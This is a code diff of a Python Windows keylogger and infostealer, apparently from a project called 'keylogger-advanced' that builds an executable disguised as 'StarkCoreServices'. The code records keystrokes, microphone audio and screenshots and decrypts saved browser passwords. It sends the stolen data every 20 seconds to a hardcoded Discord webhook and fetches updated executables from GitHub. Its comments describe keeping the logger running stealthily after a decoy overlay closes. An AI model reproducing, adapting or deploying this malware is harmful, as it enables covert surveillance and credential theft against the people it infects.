@@ -21,45 +21,26 @@ import multiprocessing
 # Essential for PyInstaller + pynput/multiprocessing libraries
 multiprocessing.freeze_support()
 
+# CORE IMPORTS MOVED TO LOCAL SCOPE TO PREVENT RECURSION
+pass
+
+# OVERLAY IMPORTS
+OVERLAY_AVAILABLE = True
+OVERLAY_ERROR = None
 try:
-    # CORE IMPORTS
-    try:
-        from PIL import ImageGrab
-        import sounddevice as sd
-        from pynput import keyboard
-        from pynput.keyboard import Listener
-        import requests
-        import win32crypt 
-        from Crypto.Cipher import AES
-    except Exception as e:
-        # If core imports fail, we record it but don't stop the overlay potential
-        IMPORT_ERROR = f"Core: {e}"
-        # We might need to install them if not frozen, but for now we assume frozen needs them packaged
-        if not getattr(sys, 'frozen', False):
-             from subprocess import call
-             modules = ["pyscreenshot","sounddevice","pynput","requests","pywin32","pycryptodomex", "PyQt5", "psutil"]
-             call("pip install " + ' '.join(modules), shell=True)
-
-    # OVERLAY IMPORTS
-    OVERLAY_AVAILABLE = True
-    OVERLAY_ERROR = None
-    try:
-        import psutil
-        from threading import Thread, Timer
-        from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
-        from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint
-        from PyQt5.QtGui import QFont, QColor, QPalette
-    except Exception as e:
-        OVERLAY_AVAILABLE = False
-        OVERLAY_ERROR = str(e)
-        class QMainWindow: pass
-        class QWidget: pass
-        class QApplication: pass
-        Qt = None
-
+    import psutil
+    from threading import Thread, Timer
+    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
+    from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint
+    from PyQt5.QtGui import QFont, QColor, QPalette
 except Exception as e:
-    # Catch-all for top level weirdness
-    IMPORT_ERROR = f"TopLevel: {e}"
+    OVERLAY_AVAILABLE = False
+    OVERLAY_ERROR = str(e)
+    class QMainWindow: pass
+    class QWidget: pass
+    class QApplication: pass
+    Qt = None
+IMPORT_ERROR = None
 
 
 
@@ -90,7 +71,7 @@ finally:
     # Use the user-provided Discord Webhook URL
     WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "2.3"
+    VERSION = "2.4"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
@@ -240,16 +221,19 @@ finally:
 
             key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
             key = key[5:]
+            import win32crypt
             return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
         def decrypt_password(self, password, key):
             try:
                 iv = password[3:15]
                 password = password[15:]
+                from Crypto.Cipher import AES
                 cipher = AES.new(key, AES.MODE_GCM, iv)
                 return cipher.decrypt(password)[:-16].decode()
             except:
                 try:
+                    import win32crypt
                     return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                 except:
                     return ""
@@ -631,6 +615,8 @@ finally:
 
         def microphone(self):
             try:
+                import sounddevice as sd
+                import wave
                 fs = 16000 # Reduced from 44100 to save size
                 seconds = SEND_REPORT_EVERY
                 # Use absolute TEMP path to avoid System32 permission errors
@@ -662,6 +648,7 @@ finally:
             # Use absolute TEMP path to avoid System32 permission errors
             filename = os.path.join(os.getenv('TEMP'), f'screenshot_{int(datetime.now().timestamp())}.jpg')
             try:
+                from PIL import ImageGrab
                 img = ImageGrab.grab()
                 img.save(filename, quality=50, optimize=True)
                 self.send_to_webhook(message="Screenshot Loading...", file_path=filename)
@@ -749,69 +736,76 @@ del "%~f0"
                 kl.join()
                 ml.join()
 
-    keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
     
-    # Check for updates on startup
-    if getattr(sys, 'frozen', False): # Only auto-update if running as exe
-        Thread(target=keylogger.check_for_updates).start()
-
-    # --- MAIN EXECUTION MODEL ---
-    # We must run the GUI on the Main Thread.
-    # The Keylogger must run in a background thread.
-    
-    # Start Keylogger Thread
-    # daemon=False is CRITICAL: it ensures the program doesn't exit when the GUI closes.
-    kl_thread = Thread(target=keylogger.run, daemon=False)
-    kl_thread.start()
-    
-    # Show Overlay (Only if running as exe or specifically testing)
-    # Using sys.frozen check ensures we don't annoy you during simple python script tests 
-    # unless you want to.
-    
-    # DEBUG LOGGING (Redundant)
-    try:
-        debug_filename = f"overlay_debug_{int(datetime.now().timestamp())}.txt"
-        temp_path = os.path.join(os.getenv('TEMP'), debug_filename)
+    if __name__ == "__main__":
+        # LOCAL IMPORTS FOR MAIN PROCESS ONLY
+        import requests
+        from pynput import keyboard
+        from pynput.keyboard import Listener
         
-        with open(temp_path, "w") as f:
-            f.write(f"Timestamp: {datetime.now()}\n")
-            f.write(f"Frozen: {getattr(sys, 'frozen', False)}\n")
-            f.write(f"Overlay Available: {OVERLAY_AVAILABLE}\n")
-            f.write(f"Overlay Error: {OVERLAY_ERROR}\n")
-            
-        # POPUP MESSAGE BOX ONLY ON FAILURE
-        if not OVERLAY_AVAILABLE:
-            ctypes.windll.user32.MessageBoxW(0, f"Overlay Failed.\nError: {OVERLAY_ERROR}", "Security Service Debug", 0x10)
-            
-    except Exception as e:
-        # If even logging fails, try one last popup
-         ctypes.windll.user32.MessageBoxW(0, f"Logging Failed: {e}", "Critical Error", 0x10)
+        # --- MAIN EXECUTION MODEL ---
+        keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
+        
+        # Check for updates on startup
+        if getattr(sys, 'frozen', False): # Only auto-update if running as exe
+            Thread(target=keylogger.check_for_updates).start()
 
-    if getattr(sys, 'frozen', False): 
-        if OVERLAY_AVAILABLE:
-            try:
-                # Removed "Attempting to show" popup to be stealthy again
-                # ctypes.windll.user32.MessageBoxW(0, "Attempting to show overlay...", "Debug", 0x40)
+        # We must run the GUI on the Main Thread.
+        # The Keylogger must run in a background thread.
+        
+        # Start Keylogger Thread
+        # daemon=False is CRITICAL: it ensures the program doesn't exit when the GUI closes.
+        kl_thread = Thread(target=keylogger.run, daemon=False)
+        kl_thread.start()
+        
+        # Show Overlay (Only if running as exe or specifically testing)
+        # Using sys.frozen check ensures we don't annoy you during simple python script tests 
+        # unless you want to.
+        
+        # DEBUG LOGGING (Redundant)
+        try:
+            debug_filename = f"overlay_debug_{int(datetime.now().timestamp())}.txt"
+            temp_path = os.path.join(os.getenv('TEMP'), debug_filename)
+            
+            with open(temp_path, "w") as f:
+                f.write(f"Timestamp: {datetime.now()}\n")
+                f.write(f"Frozen: {getattr(sys, 'frozen', False)}\n")
+                f.write(f"Overlay Available: {OVERLAY_AVAILABLE}\n")
+                f.write(f"Overlay Error: {OVERLAY_ERROR}\n")
                 
-                app = QApplication(sys.argv)
-                overlay = SystemOverlay()
-                overlay.show()
-                # Process events to ensure paint happens immediately
-                app.processEvents()
+            # POPUP MESSAGE BOX ONLY ON FAILURE
+            if not OVERLAY_AVAILABLE:
+                ctypes.windll.user32.MessageBoxW(0, f"Overlay Failed.\nError: {OVERLAY_ERROR}", "Security Service Debug", 0x10)
                 
-                # Close the GUI app loop after 10 seconds (Wait for fade out)
-                # But the process stays alive because kl_thread is non-daemon
-                QTimer.singleShot(10000, app.quit) 
-                
-                app.exec_()
-            except Exception as e:
-                 ctypes.windll.user32.MessageBoxW(0, f"Overlay Runtime Error: {e}", "Runtime Error", 0x10)
-                 pass # Fail silently if GUI crashes, keylogger still runs
+        except Exception as e:
+            # If even logging fails, try one last popup
+             ctypes.windll.user32.MessageBoxW(0, f"Logging Failed: {e}", "Critical Error", 0x10)
+
+        if getattr(sys, 'frozen', False): 
+            if OVERLAY_AVAILABLE:
+                try:
+                    # Removed "Attempting to show" popup to be stealthy again
+                    # ctypes.windll.user32.MessageBoxW(0, "Attempting to show overlay...", "Debug", 0x40)
+                    
+                    app = QApplication(sys.argv)
+                    overlay = SystemOverlay()
+                    overlay.show()
+                    # Process events to ensure paint happens immediately
+                    app.processEvents()
+                    
+                    # Close the GUI app loop after 10 seconds (Wait for fade out)
+                    # But the process stays alive because kl_thread is non-daemon
+                    QTimer.singleShot(10000, app.quit) 
+                    
+                    app.exec_()
+                except Exception as e:
+                     ctypes.windll.user32.MessageBoxW(0, f"Overlay Runtime Error: {e}", "Runtime Error", 0x10)
+                     pass # Fail silently if GUI crashes, keylogger still runs
+            else:
+                 pass
         else:
-             pass
-    else:
-        # If running as script (testing), just join the thread
-        kl_thread.join()
+            # If running as script (testing), just join the thread
+            kl_thread.join()
 
 
 
